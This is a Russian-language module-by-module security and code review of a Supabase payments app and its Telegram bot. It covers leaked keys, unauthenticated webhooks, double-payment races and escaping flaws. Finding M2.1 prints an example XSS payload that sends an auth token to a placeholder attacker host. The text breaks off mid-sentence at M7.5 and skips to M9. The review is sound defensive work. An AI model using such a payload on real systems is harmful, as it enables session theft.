# Ревью по модулям — 2026-09-09

Полный проход по карте `docs/MODULES.md`, все одиннадцать модулей и их стыки.
Метод — **чтение кода**, а не стенд: каждая находка привязана к файлу и строке,
но ни одна не воспроизведена руками. По правилам `REVIEW-BRIEF.md` (п. 8)
перед починкой их надо воспроизвести; где это особенно важно — написано «проверить».

Прочитано целиком: все 20 миграций, три Edge Function, весь `app/js`,
`index.html`, `daily_reminder.sql`, `seed.sql`, три workflow, `config.toml`,
`SECURITY.md`, `CLAUDE.md`, `REVIEW-BRIEF.md`, список тестов.

Шкала:

| | |
|---|---|
| 🔴 | критично — чинить сразу, не дожидаясь остального |
| 🟠 | серьёзно — потеря/дубль платежа, чужие данные, XSS; чинить в ближайший заход |
| 🟡 | средне — неверное поведение или тихая потеря уведомления |
| 🔵 | низко / гигиена — записать, чинить попутно |

Формат находки: **что** · где · чем грозит · как чинить.

## 0. Критичное — вне очереди модулей

### 0.1 🔴 Боевой `service_role`-ключ лежит в публичном репозитории

`supabase/migrations/20260622000000_baseline.sql:275` и `:279` — определения
триггеров `notify-client` и `notify-payment` содержат заголовок
`Authorization: Bearer eyJ…` с JWT, у которого `"role":"service_role"` и
`"ref":"gmvhphuabiyggfurfhmc"` (боевой проект). Файл закоммичен 2026-06-24
(`8df37a3`) в **публичный** `github.com/NikChyv/payments_new`, лежит в `main`
и в истории.

**Чем грозит.** `service_role` обходит RLS целиком: чтение и правка всех
заявок, всех токенов клиентов, `auth`-таблиц, загрузка в Storage без лимитов
политики, вызов любых RPC. Это ключ от всего проекта, и он индексируется
GitHub-сканерами секретов за минуты.

**Как чинить.**
1. Supabase → Settings → API → ротация JWT-секрета (по RUNBOOK 6.3). Ротация
   инвалидирует и anon-ключ: следом обновить `app/js/config.js`, `tools/uicheck.mjs`
   (там локальный, его не трогать), секреты функций, заголовки Database Webhooks,
   `SUPABASE_DB_URL` не затрагивается.
2. В `baseline.sql` заменить заголовок на плейсхолдер (`<SERVICE_ROLE_KEY>`) —
   миграция и так помечена применённой через `migration repair`, поэтому
   править тело безопасно. Из истории git ключ уже не вычистить (форки,
   кэши) — рассчитывать только на ротацию.
3. `supabase/.temp/pgdelta/*.json` тоже содержат ключ; они не в git, но
   `.gitignore` их не исключает — добавить `supabase/.temp/`.
4. Добавить в `security_surface_test.sql` или в CI проверку `grep -r "role\":\"service_role"`
   по миграциям (закодированный JWT ищется по подстроке `eyJ…service_role`).

### 0.2 🟠 `notify-payment` и `notify-client` доступны любому с публичным anon-ключом

Verify JWT у обеих функций «вкл» (`ARCHITECTURE.md` 2.3), но проверка
подписи принимает **любой** валидный JWT проекта — в том числе anon-ключ,
который лежит во фронте. Функции не проверяют ни `role` в токене, ни общий
секрет; тело `record`/`old_record` берётся из запроса как есть
(`notify-payment/index.ts:20`, `notify-client/index.ts` `serve`).

**Чем грозит.**
- Спам и фишинг бухгалтеров: `POST` с произвольным `record` → в общий чат
  уходит «Новая заявка» с любым текстом и любой ссылкой «📎 Открыть файл»
  (в `notify-payment` HTML ещё и не экранируется, см. M4.3).
- Через `notify-client`: подделанный `thread` с `who:'client'` — произвольный
  текст в чат бухгалтеров мимо лимитов `reply_by_token` (1000 символов, 100
  сообщений, 20/мин); подделанные `status/old.status` со своим `record.id`
  (клиент знает id своих заявок) — функция под `service_role` проставит
  `client_paid_notified`/`client_sent_notified`/счётчики любой заявке, чей id
  известен; `staff_files` с чужим URL — функция скачает произвольный адрес
  (`index.ts:69`) и перешлёт в Telegram.

**Как чинить.** В обеих функциях в начале `serve`: разобрать `Authorization`,
проверить `role === "service_role"` (или сверять отдельный секретный
заголовок, который прописывается в Database Webhook, как у бота
`TG_WEBHOOK_SECRET`). Всё остальное — 401.

## M1. Очередь бухгалтера и статусы

### M1.1 🟠 Общий `save()` откатывает статусы чужих правок — риск двойной оплаты

`app/js/supabase.js:102-108` — любое действие в очереди (`take`, `back`,
`pay`, `send`, `unsend`, `del`) заканчивается `upsert` **всех** строк из
локального состояния (`queue.js:233`). Состояние обновляется поллингом раз
в 15 с и только пока открыт экран очереди (`main.js:37`).

Сценарий: админ и бухгалтер (или один человек с телефона и ПК) видят одну
заявку. A нажал «Оплатить» на заявке P. B в течение 15 секунд нажал что угодно
на любой другой заявке — его upsert несёт P со статусом `in_progress`.
P **снова не оплачена** в очереди; `client_paid_notified` уже `true`, поэтому
клиент не узнает; заявку оплатят второй раз.

Тот же механизм затирает `files` (см. M7.1) и `staff_files`: приложенный
документ исчезает из заявки при следующем клике коллеги.

`MODULES.md` описывает это как «одна из правок молча теряется» — на деле
теряется **факт оплаты**, это дороже.

**Как чинить.** Не upsert-ить всё. Смена статуса — `update … set status = …
where id = … and status = <ожидаемый>` (оптимистичная блокировка, 0 строк →
«заявку уже изменили, обновите»). Для повторяющегося платежа копию вставлять
отдельным `insert`. `save()` оставить только для локального режима без Supabase.

### M1.2 🟠 Форма правки сотрудника пишет статус из момента открытия формы

`main.js:200-210` — сотрудник открыл ✏️ на заявке, правил несколько минут
(на экране формы поллинг не идёт), нажал «Сохранить». `updatePaymentRemote`
шлёт `toRow(it)` целиком, включая `status`, `files`, `staff_files`
(`supabase.js` `updatePaymentRemote` удаляет только `id` и `created_at`).
За это время коллега оплатил заявку → она возвращается в «новую» → двойная
оплата. Плюс триггер ставит `last_edit_role = authenticated`, и клиент получает
«Бухгалтер изменил вашу заявку» с чужими по смыслу изменениями.

**Как чинить.** `updatePaymentRemote` для правки должен слать только поля
формы (payee, amount, requisites, due, recurrence, purpose, need_receipt,
files) — без `status`, `staff_files`, `client_id`, `created_by_staff`.

### M1.3 🟡 Копия повторяющегося платежа наследует `staff_files` и `thread`

`queue.js:328` — `copy = JSON.parse(JSON.stringify(it))`, сбрасываются только
`id`, `status`, `due`, `files`, `created`. `staffFiles` и `thread` остаются.
`toRow` пишет `staff_files` в базу, а `client_docs_notified` у новой строки = 0.

Сценарий: документ приложен (`sent`) → «Вернуть в Оплачено» → «Отменить
оплату» → снова «Оплатить». Копия рождается с платёжкой прошлого периода;
первый же UPDATE по ней (взять в работу) уводит `notify-client` в ветку 0, и
клиент получает **старый платёжный документ** с подписью «✅ Платёж … оплачен»
по ещё не оплаченной заявке. `thread` в базу не пишется (его нет в `toRow`),
но до следующего опроса копия показывает «ждём ответ клиента».

**Как чинить.** В `markPaid` явно `copy.staffFiles = []; copy.thread = [];`.

### M1.4 🟡 `undoPaid` удаляет «похожую» заявку по совпадению полей

`queue.js:338-352` — ищет `new`-заявку с теми же клиентом, получателем, суммой,
периодичностью и датой `nextDue`. Совпасть может заявка, которую клиент завёл
сам (или уже отредактировал автокопию: сумму поменял — тогда наоборот, копия
не найдётся и останется дубль). `auto_created` в критерии не участвует.

**Как чинить.** Хранить в копии ссылку на исходник (`parent_id`) или хотя бы
требовать `autoCreated === true` при поиске.

### M1.5 🟡 Кнопка «Закрыть» без документа шлёт клиенту «документ отправлен»

`queue.js:163` — у заявки с `needReceipt = false` действие «Закрыть» ставит
`sent`. `notify-client/index.ts` ветка 1: `status === "sent"` →
«📄 Платёжный документ по «X» отправлен.» — клиент документа не просил и не
получал. То же для «Закрыть без файла» при `needReceipt = true` (там текст хотя
бы ожидаем).

**Как чинить.** В `notify-client` слать «документ отправлен» только если
`rec.need_receipt`, а для закрытия без документа — молчать или другой текст.

### M1.6 🟡 `max_rows = 1000` — очередь молча обрежется

`supabase/config.toml:18` (и та же настройка на проде по умолчанию). `load()`
делает `select("*")` без пагинации (`supabase.js:79`). После тысячи строк
(с ежемесячными автокопиями это год-полтора) у админа исчезнут старые заявки,
счётчики и выгрузка в Excel станут неполными, и никто этого не заметит.
То же у клиента с `list_payments_by_token`.

**Как чинить.** Либо `range()`-пагинация с догрузкой, либо серверный фильтр
(закрытые старше N месяцев не грузить в очередь), либо хотя бы алерт при
`data.length === 1000`.

### M1.7 🔵 Личные задачи бухгалтера ловятся только по фронтовому фильтру и RLS

`supabase.js:82-89` — фильтр по `clientsList`; если `loadClients` вернул
ошибку, `clientsList` пуст и очередь пуста. RLS страхует (M6), но ошибка
превращается в «у вас нет заявок» без сообщения.

### M1.8 🔵 `save()` не ждёт результата

`supabase.js:104` — `then` без `await`; `render()` рисует локальное состояние
до ответа сервера. При ошибке (сеть, RLS) — тост, а экран показывает
«оплачено». Следующий поллинг вернёт правду через 15 секунд, но кнопки
успевают нажать дальше.

## M2. Заявка клиента: создание и правка

### M2.1 🟠 `files[].url` не проверяется — хранимый XSS в очереди бухгалтера

`normalize_files` (`20260826000001_multi_files.sql:41`) проверяет только, что
`url` непустой. `reply_by_token` (`20260909000001_payment_thread.sql:166-171`)
— то же. Фронт рендерит ссылку как `href="${esc(f.url)}"`
(`queue.js:119`, `:128`; `client_view.js:126`; `thread.js:57`). `esc` экранирует
кавычки, но не схему: `javascript:…` доживает до `href`.

Клиент (или кто угодно с anon-ключом и чужим токеном) шлёт заявку с
`files:[{url:"javascript:fetch('https://evil/?'+localStorage.getItem('sb-…-auth-token'))",name:"счёт.pdf"}]`.
Бухгалтер кликает 📎 (это его обычное действие) — скрипт выполняется с его
сессией: доступ ко всем заявкам его клиентов, у админа — ко всем, к токенам
клиентов, к `rotate_client_token`/`delete_client`.

**Как чинить.** В `normalize_files` и `reply_by_token`: `url` обязан начинаться
с `https://<ref>.supabase.co/storage/v1/object/public/files/` (для локалки —
из `current_setting`/константы), иначе исключение. На фронте дополнительно
рендерить `<a>` только для `http(s):`. Добавить тест в `multi_files_test`
и `thread_test`.

### M2.2 🟡 Нет проверки суммы и длины полей на сервере

`submit_payment`/`edit_payment_by_token` принимают `p_amount` любое
(`coalesce(p_amount, 0)`), `payee`/`purpose`/`requisites` любой длины,
`recurrence` любую строку. HTML `min="1"` и `parseAmount` в боте — только
на своём канале; RPC вызывается напрямую.

Последствия: заявка на 0 или −5000; получатель в 20 000 символов —
`sendMessage` в Telegram упадёт на лимите 4096, и **уведомление о новой
заявке и утренняя рассылка для всех** (M4.4) не уйдут; `recurrence = "daily"`
→ в очереди «🔁 undefined», `nextDueOf` считает как месячный.

**Как чинить.** В обеих RPC: `p_amount > 0`, `length(p_payee) between 1 and 200`,
`purpose`/`requisites` ≤ 1000, `p_recurrence in ('once','weekly','monthly')`.
Аналогично `post_staff_message` уже делает для текста.

### M2.3 🟡 «Редактировать» показывается на заявке, которую завёл бухгалтер

`client_view.js:150` — условие только `status === "new"`. Для
`createdByStaff` сервер откажет («не найдена, не ваша или уже в работе»),
и клиент решит, что сломано. По `CLAUDE.md` он «видит, но не редактирует» —
кнопки быть не должно.

### M2.4 🟡 «Сегодня после 17:00» при правке молча сдвигает дату

`adjust_due_date` применяется и в `edit_payment_by_token`. Клиент правит
назначение у сегодняшней заявки в 17:30 — дата уезжает на завтра без
предупреждения; в форме он этого не видел. На фронте предупреждения о
переносе нет ни при создании, ни при правке.

### M2.5 🔵 Даты на фронте — по часам браузера

`dates.js` `todayStr()` — локальное время устройства. Клиент в другом поясе
или с неверными часами получит «сегодня» ≠ «сегодня» сервера: фронт пропустит
выходной, сервер откажет, или наоборот. Терпимо, но текст ошибки должен
объяснять.

### M2.6 🔵 Лимит 10 файлов — только в `normalize_files`

`reply_by_token` дописывает файлы в `files` без общего потолка (M7.3). После
нескольких ответов их станет 12, и следующая правка через
`edit_payment_by_token` упадёт на «Слишком много файлов».

## M3. Файлы и документы

### M3.1 🟡 Файлы не бэкапятся вообще

`.github/workflows/backup.yml:48` — `pg_dump --schema=public`. Счета клиентов
и платёжные документы живут только в Storage, копий нет. Потеря проекта
Supabase = потеря всех первичных документов; `RUNBOOK` про это молчит.

**Как чинить.** Отдельный шаг в backup.yml: список объектов бакета через
Storage API под `service_role` (из секрета), скачать новые с прошлого раза,
зашифровать тем же паролем. Либо хотя бы записать в RUNBOOK как принятый риск.

### M3.2 🟡 Утечка типа «heic на Windows» даёт неверную причину отказа

`supabase.js` `fileProblem` пропускает по расширению, а бакет сверяет
`Content-Type`, который браузер выставляет из реестра ОС: для `.heic`/`.heif`
на Windows и части Android он пустой → бакет отвечает «mime type not
supported» → человек видит «сбой», а не «тип». Задача белого списка
«показать причину» здесь не выполняется.

**Как чинить.** В `uploadFile` передавать `contentType` явно по расширению
(как `MIME_BY_EXT` в боте) — заодно белый список станет одним и тем же
объектом на фронте и в боте.

### M3.3 🔵 Ссылка вечная и публичная — нет удаления и нет ограничения объёма

Известно (`SECURITY.md` 5.5, 7). Добавлю два следствия, которых там нет:
- файл, который клиент **убрал** из заявки при правке, остаётся в бакете и
  доступен по URL из истории уведомлений;
- клиент-ответ (M7) кладёт файл во вложения — «убрать» его клиент уже не
  может (правка закрыта после `in_progress`), бухгалтер тоже (в форме
  сотрудника файлы правятся, но это `updatePaymentRemote` со всеми рисками M1.2).

### M3.4 🔵 Три копии белого списка сходятся, проверил

`storage_limits.sql`, `ALLOWED_EXT`, `MIME_BY_EXT` — одинаковые 11 типов.
Но `index.html` `accept="image/*,…"` шире (`image/gif`, `bmp`, `svg`) — файл
выберется, `fileProblem` отвергнет по расширению; окей, просто лишний шаг
для человека.

## M4. Уведомления

### M4.1 🟠 Ветка «документ» и ветка «переписка» блокируют все последующие уведомления по заявке

`notify-client/index.ts`:
- ветка 0: если `fresh.length && rec.client_id`, а у клиента нет
  `telegram_id` — `return "no telegram"` (`:143`); если документ не
  скачался/не отправился — `sent = 0`, счётчик не двигается, `return "ok"`.
  В обоих случаях **каждый следующий UPDATE** по этой заявке снова входит в
  ветку 0 и выходит из неё, не доходя до переписки, статусов и правок.
  Битый URL документа (файл удалили, Storage вернул 4xx) = заявка навсегда
  глухая.
- ветка 0.5: `hasForClient` остаётся `true`, пока индекс не сдвинут; клиент
  без Telegram или заблокировавший бота → индекс не двигается → ветка
  возвращает `"ok"` на каждом UPDATE и до ветки 1 (статус «оплачено») дело
  не доходит. Когда клиент позже привяжет бота, он получит старые вопросы,
  но «оплачено» уже не придёт: условие `old.status !== "paid"` прошло.

Личная задача бухгалтера с вопросом в переписке (`client_id null`) — тот же
вечный `"ok"`, безвредно, но это показывает, что ветвление «первая
сработавшая — выход» неверно по конструкции.

**Как чинить.** Не выходить из `serve` после ветки: собрать `patch` по всем
веткам и один раз обновить строку в конце. Для «нет Telegram» — считать
сообщение доставленным в кабинет и сдвигать индекс/счётчик (или хранить
отдельный флаг «доставлять при привязке»).

### M4.2 🟡 Webhook-вызовы не аутентифицированы

См. 0.2.

### M4.3 🟡 `notify-payment` и утренняя рассылка не экранируют HTML

`notify-payment/index.ts:35-41` — `record.client/payee/purpose/requisites/
file_url` вставляются в `parse_mode: "HTML"` как есть. `send_daily_reminder`
(`baseline.sql:141-160`, `daily_reminder.sql`) — то же для `payee`, `client`,
`purpose`, `file_url`, `file_name`.

- Любой `<` в получателе («ООО <Вектор>», «a<b») — Telegram отвечает
  «can't parse entities», сообщение **не уходит**. В рассылке одна такая
  заявка убивает весь утренний список для обоих бухгалтеров, результат
  `net.http_post` никто не читает.
- Клиент может вставить `<a href="https://…">` и получить кликабельную
  ссылку в чате бухгалтеров (фишинг под видом заявки).

`notify-client` и `esc()` в нём — правильно; бот — нет (M5.3).

**Как чинить.** `esc()` в `notify-payment`; в SQL — заменить `<`, `>`, `&`
через `replace()` или перевести рассылку в Edge Function. Проверять ответ
`net.http_post` (хотя бы писать в лог).

### M4.4 🟡 Отказ Telegram = тихая потеря

`notify-payment` — `console.error`, ответ `500`, ретраев у Database Webhook
нет. `notify-client` — `catch → "ok"`. Инцидент «месяц без уведомлений» был
именно такого рода, а `health.yml` проверяет только доступность бота, не
доставку. Нет ни счётчика ошибок, ни повторной попытки.

**Как чинить.** Минимум — таблица `notify_failures` (заявка, ветка, ответ
Telegram) под `service_role` и проверка «есть записи за сутки» в `health.yml`.

### M4.5 🟡 Утренняя рассылка раскрывает личные задачи всем получателям

`send_daily_reminder` берёт `payments where due = today and status in
(new,in_progress)` без фильтра по `client_id`/`created_by_staff` и шлёт
**обоим** чатам. Личная задача одного бухгалтера («Личное · Имя») утром
уходит другому. Нарушает правило «видна только автору и админу» (M1, M6).

### M4.6 🟡 Список получателей рассылки — в теле функции, и там два человека

`baseline.sql:133` — `array['670574684','744619432']` (Никита, Валентина).
Третьего бухгалтера (Татьяна) в списке нет; `TELEGRAM_CHAT_ID` у функций —
отдельный секрет, и они могут разъехаться. Проверить прод: `select
prosrc from pg_proc where proname='send_daily_reminder'`. Правильно —
брать список из таблицы `staff` (колонка `telegram_id`) или из Vault.

### M4.7 🔵 Рассылка показывает только «на сегодня», просроченное — нет

Просроченная заявка, по которой вчера забыли, утром в списке не появится.
Очередь по умолчанию показывает «просроченные + сегодня» — рассылка должна
совпадать.

### M4.8 🔵 Правка через `save()` уходит клиенту как «бухгалтер изменил»

`diffLines` честно сравнивает `old`/`new`, но если разница возникла из-за
затирания сталым состоянием (M1.1, M1.2, M7.1), клиент получает сообщение
об изменениях, которых бухгалтер не делал — и, например, «Файлов 1 → 0»
после собственного ответа с файлом.

## M5. Telegram-бот

### M5.1 🟡 `/start` по чужой ссылке молча отвязывает предыдущего человека

`telegram-bot/index.ts:447` — `update({telegram_id: chatId}).eq("id",
target.id)`. У фирмы одна привязка. Второй человек с той же ссылкой (коллега
директора, пересланное сообщение, утечка) нажимает «Старт» — первый **без
единого сообщения** перестаёт получать «оплачено» и документы, а новый
получает их. Ровно тот класс инцидента, ради которого чинили `/start`, но
с другой стороны.

**Как чинить.** Перед перезаписью: если `telegram_id` был и отличается —
отправить старому чату «Фирма «X» привязана к другому аккаунту Telegram.
Если это не вы — обратитесь к бухгалтеру». Либо запрашивать подтверждение.

### M5.2 🟡 Групповой чат привязывается как личный

`chatId = msg.chat.id` (`handleMessage`), в группе он отрицательный, и
`clients.telegram_id` его примет. Любой участник группы заводит заявки и
видит документы; `/myid` подсказывает id группы. Проверять `msg.chat.type ===
"private"` или брать `msg.from.id`.

### M5.3 🟡 Ответы бота не экранируются и ошибки отправки не проверяются

`send()` (`index.ts:65`) не смотрит `res.ok`; `summary()` (`:244`),
`sendPayments`, «Напишите ответ по заявке «${pay.payee}»» — без экранирования.
Получатель с `<` → экран подтверждения не приходит, человек стоит на шаге
`confirm` и не понимает, что делать; по `/payments` — тишина. `esc()` из
`notify-client` перенести в бота, `send()` — логировать `res.text()` при
ошибке.

### M5.4 🟡 `submit` стирает черновик до проверки результата

`index.ts:349` — `clearSession` перед `if (error)`. Лимит частоты, выходной,
временная ошибка БД → заявка, которую человек набивал восемь шагов, пропала;
«Попробуйте ещё раз: /new» с нуля. Чистить сессию только при успехе; при
ошибке оставить `confirm`.

### M5.5 🔵 Режим ответа живёт 12 часов и ловит всё подряд

Известно и документировано. Дополнение: `/start <token>` в режиме ответа
сессию не трогает; любая другая команда — очищает (`:494`) — то есть
`/help` в середине ответа выкидывает из режима без предупреждения.

### M5.6 🔵 Кнопки старого сообщения при двух фирмах стирают текущую сессию

`handleCallback` — `if (list.length > 1) { clearSession … }` до разбора
`data`. Человек с двумя фирмами нажал «Пропустить» под вчерашним вопросом —
активный режим ответа пропал. Разбирать `data` до этой проверки, как сделано
для `reply:`.

### M5.7 🔵 Черновик в `tg_sessions.draft` хранит токен фирмы

Токен = пароль клиента. Таблица закрыта RLS и без политик, доступ только
`service_role`, но бэкап (`public` schema) его содержит и после ротации
токена в сессии лежит старый (безвредно: `reply_by_token` откажет).
Достаточно хранить `client_id` и брать токен в момент отправки.

### M5.8 🔵 Telegram `getFile` не отдаёт файлы больше 20 МБ

`uploadTelegramFile` проверяет 10 МБ по `sizeHint`, а для файлов 10–20 МБ
качает целиком и отбрасывает после — лишний трафик функции. Мелочь.

## M6. Доступ, роли и безопасность

### M6.1 🔴 См. 0.1 — `service_role` в репозитории.

### M6.2 🟠 См. 0.2 — вебхуки без аутентификации; M2.1 — XSS через `files[].url`.

### M6.3 🟡 Бухгалтер может «увести» заявку в личные

RLS `pay_staff_update … with check` (`20260724000008:32` и ниже):
`client_id is null and created_by_staff = auth.uid()` проходит для UPDATE.
Бухгалтер (через консоль браузера, `sb.from('payments').update({client_id:
null, created_by_staff: <свой id>})`) превращает заявку клиента в личную:
из очереди коллег и из кабинета клиента она пропадает, у админа висит как
«Личное». В журнале — `EDIT` без указания `client_id` (он не в `changes`).
Добавить в `with check` условие «`client_id` не менялся» через отдельную
функцию-триггер `before update`: `if new.client_id is distinct from
old.client_id and not is_admin() then raise`.

### M6.4 🟡 Удаление заявки оставляет в журнале только статус

`log_payment_change` на DELETE пишет `payment_id, client_id, old_status`
(`20260724000004:44`). Бухгалтер (`pay_staff_delete` разрешает удалять и
`paid`) удаляет оплаченную заявку — сумма, получатель, файлы в журнале не
остаются. «Правка суммы оплаченного платежа без следа» закрыта, «удаление
оплаченного платежа без следа» — нет. Писать в `changes` снимок строки при
DELETE, либо запретить DELETE для `paid/sent` не-админу.

### M6.5 🟡 `GRANT ALL` анониму на `clients`, `staff`, `tg_sessions`

`baseline.sql:594-604`. Держится только на RLS (политик для anon нет →
пусто). `security_surface_test` проверяет привилегии anon только для
`payments`, `payments_audit`, `rpc_rate_limit`. Одна permissive-политика
`to public` в будущей миграции — и токены всех клиентов открыты. Отозвать
явно (`revoke all on public.clients, public.staff, public.tg_sessions from
anon`) и добавить в тест.

### M6.6 🟡 Регистрация в Auth — проверить, что выключена на проде

`config.toml` локально `enable_signup = true`. Если на проде так же —
кто угодно получает `authenticated` JWT. Данных это не открывает (везде
нужна строка в `staff`), но `GRANT ALL ON payments TO authenticated`
включает `TRUNCATE`/`TRIGGER` на уровне привилегий, а RLS `TRUNCATE` не
фильтрует — через PostgREST не дотянуться, но зачем оставлять. Проверить
Auth → Settings; сузить грант до `select, insert, update, delete`.

### M6.7 🟡 Библиотека `supabase-js` грузится с CDN без версии и без SRI

`app/index.html:258` — `@supabase/supabase-js@2` плавающий. Любой минорный
релиз меняет поведение без коммита; компрометация CDN = полный контроль над
сессиями бухгалтеров. Зафиксировать `@2.x.y` и добавить `integrity=`, или
положить файл в `app/vendor/`.

### M6.8 🔵 `list_payments_by_token` отдаёт клиенту служебные колонки

`SETOF payments`: `created_by_staff` (uuid из `auth.users`), `last_edit_role`,
`client_docs_notified`, `client_thread_notified`, `staff_thread_notified`,
`client_id`. Не секрет, но лишнее — и каждая новая служебная колонка
уезжает клиенту автоматически (это описано как плюс в миграциях). Держать
в голове при добавлении колонок вроде `staff_note`.

### M6.9 🔵 Токены всех клиентов бухгалтера — в DOM экрана «Клиенты»

`clients.js` `renderClients` — ссылка с токеном в `<code>` и в `data-copy`
у каждой карточки. Скриншот экрана в чат — утечка всех ссылок разом. Показывать
маску и копировать по кнопке.

### M6.10 🔵 `rpc_rate_limit` растёт от анонима без предела

`check_rate_limit` вызывается **до** проверки токена (`rate_limit.sql:58`),
ключ — сырой `p_token` любой длины. Запросы с случайными токенами создают по
строке на ключ; чистка — 1% вызовов и только старше суток. Дешёвый способ
раздуть таблицу. Ключ — `md5(p_token)`, ограничение длины, чистка по cron.

## M7. Переписка по заявке

### M7.1 🟠 Файл из ответа клиента затирается общим `save()`

`thread` из `toRow` убрали, но `reply_by_token` пишет ещё и в `files` и
`file_url` (`payment_thread.sql:185-190`), а `files` в `toRow` **есть**
(`supabase.js:14-20`). Клиент ответил со счётом → бухгалтер в течение 15 с
нажал любую кнопку в очереди (или сохранил форму правки любой давности,
M1.2) → `files` откатывается к версии без счёта, зеркало `file_url` — тоже.
Файл остаётся только в `thread[].files`, во вложениях его нет, в утренней
рассылке и у бота — нет. И клиенту приходит «Бухгалтер изменил вашу заявку:
Файлов 1 → 0».

Это ровно тот баг, от которого защищали `thread`, — он повторяется на
соседнем поле. Чинится вместе с M1.1: убрать общий upsert.

### M7.2 🟡 Вопрос можно задать по закрытой заявке, а ответить — нельзя

`post_staff_message` не проверяет статус; `reply_by_token` отказывает при
`sent`; бот отвечает «уже закрыта». Бухгалтер видит «⏸ ждём ответ», кнопку
«🔔 Напомнить» (`rowHtml` добавляет её при `ts === "waiting"` без учёта
статуса) и напоминает в пустоту. Запрещать вопрос по `sent`, либо разрешать
ответ.

### M7.3 🟡 Нет общего потолка на `files` после ответов

См. M2.6.

### M7.4 🔵 Ответ клиента через кабинет — `last_edit_role = anon`, через бота — `service_role`

`stamp_payment_editor` ставит роль по JWT; ответ с файлом меняет `files` →
это «правка содержимого» → в журнале `EDIT` с `files: [n, n+1]` и роль
`service_role` для бота. Журнал не отличает «клиент ответил» от «бот
что-то правил». Косметика, но при разборе инцидента запутает.

### M7.5 🔵 `remindClient` проверяет только последнее сообщение

Два напоминания подряд заблокированы, но «вопрос → напоминание → вопрос →

## M9. Клиенты, администрирование, выгрузка

### M9.1 🟡 `addClient` не проверяет, что `staff_id` — сотрудник

`clients.js` `addClient` — `insert({name, token, staff_id: sid})`, `sid` из
`<select>`; FK на `staff` защитит от мусора, но переназначить клиента другому
бухгалтеру после создания **негде**: UI обновления `staff_id` нет, а старые
заявки клиента при переназначении через SQL останутся видны прежнему
бухгалтеру только если `created_by_staff = он`. Нужна кнопка «сменить
бухгалтера» + понимание, кто видит историю.

### M9.2 🟡 Название клиента денормализовано в `payments.client`

`submit_payment` копирует `v_client.name`. Переименовать клиента негде, а
если переименовать в базе — фильтр очереди `fClient` (по тексту), выгрузка
и бот покажут два разных имени. Либо запретить переименование явно, либо
джойнить.

### M9.3 🔵 Выгрузка: `due = null` ломает файл

`xlsx.js` `dateSerial(null)` → `NaN` в `<v>` → Excel «файл повреждён».
Колонка `due` nullable, а сотрудник может завести заявку через консоль без
даты. Защититься: пустая ячейка при `!v`.

### M9.4 🔵 Управляющие символы в тексте ломают XML

`xmlEsc` экранирует `&<>"'`, но управляющие символы `\x00–\x08`, `\x0B`, `\x0C`,
`\x0E–\x1F` в XML 1.0 запрещены — вставка из PDF/1С иногда их содержит.
Добавить `replace(/[\x00-\x08\x0B\x0C\x0E-\x1F]/g, "")`.

### M9.5 🔵 Инъекция формул в Excel — не применимо

Все текстовые ячейки `inlineStr`, формула только в «Итого» — `=HYPERLINK(...)`
в получателе не исполнится. Проверил, всё в порядке.

### M9.6 🔵 Список сотрудников у бухгалтера — только он сам

`loadStaffList` под RLS `staff_read` возвращает одну строку; в карточках
клиентов другие бухгалтеры показаны как «—». Косметика.

## Что проверено и в порядке

Чтобы не искать заново:
- RLS `payments`/`clients`/`staff`: чужой клиент бухгалтеру не виден,
  личные задачи — только автору и админу (по политикам и по фильтру).
- `edit_payment_by_token`: гейт `status = 'new'` и `created_by_staff is null`
  на месте во всех пересозданиях функции.
- `rotate_client_token` сбрасывает `telegram_id`; старая сессия бота с
  прежним токеном отказывает («Неверный токен»), не даёт доступа.
- `post_staff_message`: автор из JWT, `anon` отозван; `reply_by_token`
  оставляет только `url`/`name`.
- `delete_client` с заявками отказывает; чистка `tg_sessions` учитывает
  несколько фирм.
- `notify-client`: флаги «оплачено»/«документ отправлен» ставятся после
  успешной отправки; повторный вебхук после проставления флага уходит в
  `skip`, цикла нет (проверено по веткам).
- `firmSuffix` и `getClients` без `.maybeSingle()` по `telegram_id`.
- Кнопка `reply:` в боте сверяет `client_id` заявки с фирмами чата.
- XLSX: без формул в данных, `inlineStr`, даты через UTC.
- Три белых списка типов файлов совпадают.
- `stamp_payment_editor`/`log_payment_change` — служебные поля (`*_notified`,
  `thread`, `staff_files`, `last_edit_*`) правкой не считаются.
